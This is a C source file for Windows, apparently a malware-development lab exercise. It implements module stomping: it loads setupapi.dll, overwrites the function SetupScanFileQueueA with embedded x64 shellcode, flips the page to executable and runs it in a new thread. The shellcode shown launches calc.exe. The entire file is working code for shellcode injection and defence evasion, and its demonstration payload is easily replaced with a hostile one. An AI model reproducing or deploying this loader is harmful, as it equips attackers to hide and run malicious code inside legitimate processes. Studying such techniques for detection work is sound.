#include <windows.h>
#include <stdio.h>

#define		SACRIFICIAL_DLL          "setupapi.dll"
#define		SACRIFICIAL_FUNC         "SetupScanFileQueueA"

unsigned char Payload[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xcd\x64\x9f\x68\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x43\x3a\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x53\x79"
"\x73\x74\x65\x6d\x33\x32\x5c\x63\x61\x6c\x63\x2e\x65\x78"
"\x65\x00";

int main() {
	DWORD dwOldProtection = NULL;
	PVOID pAddress = NULL;
	HMODULE hModule = NULL;
	HANDLE hThread = NULL;
	BOOL bSTATE = TRUE;

	printf("press enter to load \"%s\" ", SACRIFICIAL_DLL);
	getchar();

	printf("[+] Loading \n");
	hModule = LoadLibraryA(SACRIFICIAL_DLL);
	if (hModule == NULL) {
		printf("[!) LoadLibraryA Failed with error %d \n", GetLastError());
		return -1;
	}
	printf("[+] dll loaded\n");

	pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
	if (pAddress == NULL) {
		printf("[!] GetprocAddress Failed With Error %d \n", GetLastError());
		bSTATE = FALSE;
		goto Cleanup;
	}

	printf("[+] Address Of \"%s\" : 0x%p \n", SACRIFICIAL_FUNC, pAddress);

	if (!VirtualProtect(pAddress, sizeof(Payload), PAGE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE;
		goto Cleanup;
	}
	printf("[+] Press Enter To Run The x64dbg \n");
	getchar();


	memcpy(pAddress, Payload, sizeof(Payload));

	if (!VirtualProtect(pAddress, sizeof(Payload), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE;
		goto Cleanup;
	}

	printf("[+] Press Enter To Run The Payload \n");
	getchar();

	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] CreateThread failed: %d\n", GetLastError());
		bSTATE = FALSE;
		goto Cleanup;
	}
	printf("[+] Thread created! Shellcode is running.\n");

	WaitForSingleObject(hThread, INFINITE);

Cleanup:
	if (hThread) {
		CloseHandle(hThread);
		hThread = NULL;
	}

	if (hModule) {
		FreeLibrary(hModule);
		hModule = NULL;
	}

	return bSTATE ? EXIT_SUCCESS : EXIT_FAILURE;
}